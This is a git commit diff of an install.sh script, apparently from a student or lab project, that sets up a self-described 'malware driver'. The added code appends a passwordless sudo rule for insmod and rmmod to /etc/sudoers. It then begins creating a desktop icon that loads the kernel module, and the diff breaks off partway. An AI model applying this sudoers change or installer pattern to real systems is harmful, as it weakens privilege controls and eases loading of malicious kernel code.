93a1c8ffd279da4336787d3f2966b4055c10d168
Tony Faller <af3370@columbia.edu>
2025-02-25 16:25:05 -0500

    Fixed install/uninstall scripts

--- install.sh
+++ install.sh
@@ -27,24 +27,43 @@ fi
 # Step 2: Add a line to the sudoers file so that the malware driver can be installed WITHOUT sudo
 
 USER="tony"
-RELATIVE_SCRIPT_PATH="./driver/load.sh"
-chmod +x "$RELATIVE_SCRIPT_PATH"
-SCRIPT_PATH=$(realpath "$RELATIVE_SCRIPT_PATH")
-DESKTOP_ICON_PATH="/home/$USER/Desktop/LoadKernelModule.desktop"
+SUDOERS_FILE="/etc/sudoers"
+SUDOERS_RULE="$USER ALL=(ALL) NOPASSWD: /sbin/insmod, /sbin/rmmod"
+
+# Check if the rule is already present to avoid duplicates
+if ! sudo grep -Fxq "$SUDOERS_RULE" "$SUDOERS_FILE"; then
+    echo "Adding NOPASSWD rule to sudoers..."
+    echo "$SUDOERS_RULE" | sudo tee -a "$SUDOERS_FILE" > /dev/null
+else
+    echo "NOPASSWD rule already exists."
+fi
+
+#USER="tony"
+#RELATIVE_SCRIPT_PATH="./driver/load.sh"
+#chmod +x "$RELATIVE_SCRIPT_PATH"
+#SCRIPT_PATH=$(realpath "$RELATIVE_SCRIPT_PATH")
+#DESKTOP_ICON_PATH="/home/$USER/Desktop/LoadKernelModule.desktop"
 
 # Check if the line already exists in sudoers file.
 # If it does not, then add it.
-if ! grep -q "$USER ALL=(ALL) NOPASSWD: $SCRIPT_PATH" /etc/sudoers; then
+#if ! grep -q "$USER ALL=(ALL) NOPASSWD: $SCRIPT_PATH" /etc/sudoers; then
     # Append the necessary line to sudoers file using tee for safe editing
-    echo "$USER ALL=(ALL) NOPASSWD: $SCRIPT_PATH" | tee -a /etc/sudoers > /dev/null
-    echo "Sudoers file updated successfully."
-else
-    echo "Sudoers file already contains the necessary entry."
-fi
+#    echo "$USER ALL=(ALL) NOPASSWD: $SCRIPT_PATH" | tee -a /etc/sudoers > /dev/null
+#    echo "Sudoers file updated successfully."
+#else
+#    echo "Sudoers file already contains the necessary entry."
+#fi
+
+
 
 ######################################################################################################
 
 # Step 3: Create a desktop icon which will run a script to install the malware driver
+
+RELATIVE_SCRIPT_PATH="./driver/load.sh"
+chmod +x "$RELATIVE_SCRIPT_PATH"
+SCRIPT_PATH=$(realpath "$RELATIVE_SCRIPT_PATH")
+DESKTOP_ICON_PATH="/home/$USER/Desktop/LoadKernelModule.desktop"
 
 DESKTOP_CONTENT="[Desktop Entry]
 Version=1.0
